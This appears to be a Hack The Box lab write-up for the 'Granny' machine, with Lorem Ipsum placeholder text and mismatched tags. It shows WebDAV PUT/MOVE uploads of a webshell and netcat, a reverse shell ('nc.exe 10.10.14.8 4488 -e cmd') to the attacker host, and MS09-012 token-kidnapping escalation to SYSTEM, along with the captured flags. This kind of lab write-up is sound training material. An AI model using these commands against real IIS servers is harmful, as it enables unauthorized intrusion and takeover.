---
layout: single
title: Granny - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-granny/granny_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-granny/granny_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/granny]# nmap -Pn -n -sCV 10.10.10.15 --open                                                                        (master)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 6.0
    | http-methods:
    |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
    |_http-server-header: Microsoft-IIS/6.0
    |_http-title: Under Construction
    | http-webdav-scan:
    |   Server Type: Microsoft-IIS/6.0
    |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
    |   WebDAV type: Unknown
    |   Server Date: Tue, 02 Mar 2021 14:46:58 GMT
    |_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


2. We instantly see that it's IIS 6.0 and webdab seems to be open. Run davtest to find out more.

  [root:/git/htb/granny]# davtest -url http://10.10.10.15                                                                           (master✱)
    ********************************************************
     Testing DAV connection
    OPEN		SUCCEED:		http://10.10.10.15
    ********************************************************
    NOTE	Random string for this session: YDySC7gsiCC
    ********************************************************
     Creating directory
    MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_YDySC7gsiCC
    ********************************************************
     Sending test files
    PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.php
    PUT	cgi	FAIL
    PUT	asp	FAIL
    PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt
    PUT	shtml	FAIL
    PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.pl
    PUT	aspx	FAIL
    PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jsp
    PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html
    PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jhtml
    PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.cfm
    ********************************************************
     Checking for test file execution
    EXEC	php	FAIL
    EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt
    EXEC	pl	FAIL
    EXEC	jsp	FAIL
    EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html
    EXEC	jhtml	FAIL
    EXEC	cfm	FAIL

    ********************************************************
    /usr/bin/davtest Summary:
    Created: http://10.10.10.15/DavTestDir_YDySC7gsiCC
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.php
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.pl
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jsp
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.jhtml
    PUT File: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.cfm
    Executes: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.txt
    Executes: http://10.10.10.15/DavTestDir_YDySC7gsiCC/davtest_YDySC7gsiCC.html

  Unfortunatley we are unable to upload aspx, otherwise this would be an easy webshell. However, method 'MOVE' is allowed,
  meaning we can move already uploaded files and change their filename (and ending).

    [root:/git/htb/granny]# mv shell.aspx shell.txt                                                                                   (master✱)
    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file shell.txt                                                          (master✱)
    [root:/git/htb/granny]# curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt

  Browse for RCE: http://10.10.10.15/shell.aspx

  OR USING CADAVER:
    cadaver http://granny.htb
    mput fil.txt
    mv fil.txt fil.aspx


2. Executing nc64.exe for a reverse shell directly through my smb share doesn't work, so upload nc64.exe the same way.

    [root:/git/htb/granny]# cp /opt/nc64.exe nc64.txt
    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file nc64.txt                                                           (master✱)
    [root:/git/htb/granny]# curl -X MOVE --header "Destination:http://10.10.10.15/nc64.exe" http://10.10.10.15/nc64.txt

  Enumerating the box we find that nc64.exe is uploaded to 'c:\Inetpub\wwwroot\nc64.exe'
  Trying to execute the binary gives nothing: c:\Inetpub\wwwroot\nc64.exe 10.10.14.8 4488 -e cmd
  Lets try nc.exe instead;
    [root:/git/htb/granny]# mv nc.exe nc.txt                                                                                          (master✱)
    [root:/git/htb/granny]# curl http://10.10.10.15/ --upload-file nc.txt                                                             (master✱)
    [root:/git/htb/granny]# curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt
    Execute RCE: c:\Inetpub\wwwroot\nc.exe 10.10.14.8 4488 -e powershell

    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1082
    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1083

    We get a incomming connection, however the shell dies instantly. Lets try cmd instead of powershell.
    Execute RCE: c:\Inetpub\wwwroot\nc.exe 10.10.14.8 4488 -e cmd

    [root:/git/htb/granny]# rlwrap nc -lvnp 4488                                                                                      (master✱)
      listening on [any] 4488 ...
      connect to [10.10.14.8] from (UNKNOWN) [10.10.10.15] 1085
      Microsoft Windows [Version 5.2.3790]
      (C) Copyright 1985-2003 Microsoft Corp.

      c:\windows\system32\inetsrv> whoami
        nt authority\network service


3. Grab the 'systeminfo' and use windows-exploit-suggester.

  [root:/git/htb/granny]# python /opt/windows-exploit-suggester.py --update                                                         (master✱)
    [*] initiating winsploit version 3.3...
    [+] writing to file 2021-03-02-mssb.xls
    [*] done
  [root:/git/htb/granny]# python /opt/windows-exploit-suggester.py --database 2021-03-02-mssb.xls --systeminfo systeminfo.txt
    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
    [+] windows version identified as 'Windows 2003 SP2 32-bit'
    [*]
    [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
    [*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
    [*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
    [*]
    [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
    [*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
    [*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
    [*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
    [*]
    [E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
    [*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
    [*]
    [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
    [*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
    [*]
    [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
    [*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
    [*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
    [*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
    [*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
    [*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
    [*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
    [*]
    [M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
    [*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
    [*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
    [*]
    [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
    [*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
    [*]
    [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
    [*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
    [*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
    [*]
    [E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
    [E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
    [*]   http://www.exploit-db.com/exploits/34458/
    [*]
    [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
    [*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
    [*]
    [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
    [M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
    [E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
    [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
    [M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
    [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
    [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
    [M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
    [M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
    [M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
    [M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
    [M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
    [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
    [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
    [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
    [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
    [*]
    [M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
    [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
    [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
    [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
    [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
    [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
    [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
    [M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
    [M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
    [M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
    [M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
    [M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
    [M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
    [M] MS08-078: Security Update for Internet Explorer (960714) - Critical
    [*] done


    MS14-070:
      No output when executing binary

    MS15-051:
      Froze/crashed shell

    MS14-068:
      C:\Inetpub\wwwroot> //10.10.14.8/share/MS14-068.exe
        Traceback (most recent call last):
        File "<string>", line 14, in <module>
        File "Z:\usr\share\pyinstaller\PyInstaller-3.1.1\PyInstaller\loader\pyimod03_importers.py", line 315, in load_module
        File "Z:\usr\share\pyinstaller\PyInstaller-3.1.1\PyInstaller\loader\pyimod02_archive.py", line 323, in extract
        IOError: [Errno 9] Bad file descriptor
        ms14-068 returned -1

    MS15-010:
      C:\Inetpub\wwwroot> //10.10.14.8/share/39035.exe
        The image file \\10.10.14.8\share\39035.exe is valid, but is for a machine type other than the current machine.

    MS14-040:
      C:\Inetpub\wwwroot> //10.10.14.8/share/MS14-40-x86.exe
        [+] creating socket...
        [+] got sock 0x668
        [+] sock connected.

        [+] GO!
        [+] Retrieving Kernel info...
        [+] Kernel version: ntkrnlpa.exe
        [+] Kernel base address: 0x80800000L
        [+] HalDispatchTable address: 0x8088e078L
        Traceback (most recent call last):
        File "<string>", line 158, in <module>
        TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'


4. None of the exploits are giving anything of use. Googling about 'windows 2003 privilege escalation' and we find MS09-012,
   Privelege Escalation via Token Kidnapping.

   Setup a local SMB Server again and try the exploit:

   [root:/srv/pub-share]# smbserver.py share .
   [root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS09-012/pr.exe .

   C:\Documents and Settings> //10.10.14.8/share/pr.exe "whoami"
     /xxoo/-->Build&&Change By p
     /xxoo/-->This exploit gives you a Local System shell
     /xxoo/-->Got WMI process Pid: 1756
     begin to try
     /xxoo/-->Found token SYSTEM
     /xxoo/-->Command:whoami
      nt authority\system

   It works, we are nt authority\system! Grab user- and root.txt

    C:\Documents and Settings> //10.10.14.8/share/pr.exe "type Lakis\Desktop\user.txt"
      /xxoo/-->Build&&Change By p
      /xxoo/-->This exploit gives you a Local System shell
      /xxoo/-->Got WMI process Pid: 1756
      begin to try
      /xxoo/-->Found token SYSTEM
      /xxoo/-->Command:type Lakis\Desktop\user.txt
        700c5dc163014e22b3e408f8703f67d1

    C:\Documents and Settings> //10.10.14.8/share/pr.exe "type Administrator\Desktop\root.txt"
      /xxoo/-->Build&&Change By p
      /xxoo/-->This exploit gives you a Local System shell
      /xxoo/-->Got WMI process Pid: 3564
      begin to try
      /xxoo/-->Found token SYSTEM
      /xxoo/-->Command:type Administrator\Desktop\root.txt
        aa4beed1c0584445ab463a6747bd06e9


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

MS09-012:
  https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e
  https://www.exploit-db.com/exploits/6705
